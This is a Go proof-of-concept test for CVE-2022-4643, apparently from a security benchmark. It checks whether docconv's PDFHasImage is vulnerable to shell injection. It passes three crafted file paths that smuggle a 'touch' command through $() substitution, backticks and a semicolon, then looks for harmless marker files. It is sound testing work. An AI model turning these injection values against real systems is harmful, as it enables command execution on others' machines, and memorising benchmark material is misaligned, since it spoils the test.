// PoC for CVE-2022-4643: OS command injection in docconv PDF image detection.
//
// docconv's PDF image detection constructs a shell command using fmt.Sprintf,
// embedding a caller-supplied file path directly into the command string.
// The command is executed via exec.Command("bash", "-c", ...), so any shell
// metacharacters in the path are interpreted by bash.
//
// Three injection vectors are tested:
//   1. $() command substitution
//   2. Backtick command substitution
//   3. Semicolon command separator
//
// Each test creates a unique marker file via the injected command. Detection
// is based on whether the marker file exists after the call.
//
// Exit codes (SSE Benchmark convention):
//   0 = patched  (no injection succeeded)
//   1 = vulnerable (at least one injection vector succeeded)
package main

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/sajari/docconv"
)

func main() {
	tmpDir := os.TempDir()

	markers := []string{
		filepath.Join(tmpDir, "cve_2022_4643_test1"),
		filepath.Join(tmpDir, "cve_2022_4643_test2"),
		filepath.Join(tmpDir, "cve_2022_4643_test3"),
	}

	cleanup := func() {
		for _, m := range markers {
			os.Remove(m)
		}
	}

	// Pre-run cleanup to start from a clean state.
	cleanup()

	fmt.Println("[*] CVE-2022-4643 – docconv OS Command Injection via PDF path")
	fmt.Println()

	vulnerable := false

	// ── Test 1: Command substitution via $() ────────────────────────────────
	fmt.Println("[TEST 1] Command substitution via $() ...")
	docconv.PDFHasImage(fmt.Sprintf("$(touch %s).pdf", markers[0]))
	if _, err := os.Stat(markers[0]); err == nil {
		fmt.Println("  [VULNERABLE] $() injection succeeded – marker file created")
		vulnerable = true
	} else {
		fmt.Println("  [PATCHED]    $() injection blocked")
	}

	// ── Test 2: Command substitution via backticks ───────────────────────────
	fmt.Println("[TEST 2] Command substitution via backticks ...")
	docconv.PDFHasImage(fmt.Sprintf("`touch %s`.pdf", markers[1]))
	if _, err := os.Stat(markers[1]); err == nil {
		fmt.Println("  [VULNERABLE] backtick injection succeeded – marker file created")
		vulnerable = true
	} else {
		fmt.Println("  [PATCHED]    backtick injection blocked")
	}

	// ── Test 3: Command separator via semicolon ──────────────────────────────
	fmt.Println("[TEST 3] Command separator via semicolon ...")
	docconv.PDFHasImage(fmt.Sprintf("x.pdf; touch %s", markers[2]))
	if _, err := os.Stat(markers[2]); err == nil {
		fmt.Println("  [VULNERABLE] semicolon injection succeeded – marker file created")
		vulnerable = true
	} else {
		fmt.Println("  [PATCHED]    semicolon injection blocked")
	}

	fmt.Println()
	cleanup()

	if vulnerable {
		fmt.Println("[RESULT] VULNERABLE – at least one injection vector succeeded")
		os.Exit(1)
	}
	fmt.Println("[RESULT] PATCHED – all injection vectors blocked")
	os.Exit(0)
}
